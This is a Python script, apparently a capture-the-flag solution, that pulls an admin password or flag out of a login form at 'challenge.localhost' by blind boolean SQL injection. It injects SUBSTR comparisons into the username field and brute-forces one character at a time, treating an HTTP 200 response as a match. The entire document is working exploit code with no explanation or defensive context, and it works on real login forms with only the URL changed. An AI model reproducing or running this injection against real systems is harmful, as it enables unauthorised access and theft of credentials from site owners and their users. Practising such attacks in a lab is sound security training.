#!/usr/bin/python3

import requests

URI = 'http://challenge.localhost'
CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{-.}_'

if __name__ == "__main__":
  
  password = ''

  while password == '' or password[-1] != '}':
    for c in CHARS:
      payload = password + c
      form_data = { 
        'username': f"admin' AND SUBSTR(password, 1, LENGTH('{payload}')) = '{payload}'--",
        'password': "1"
      }
      req = requests.post(URI, data=form_data)

      print(f'try with: {payload}')

      if req.status_code == 200:
        password = payload
        break
  
  print(password)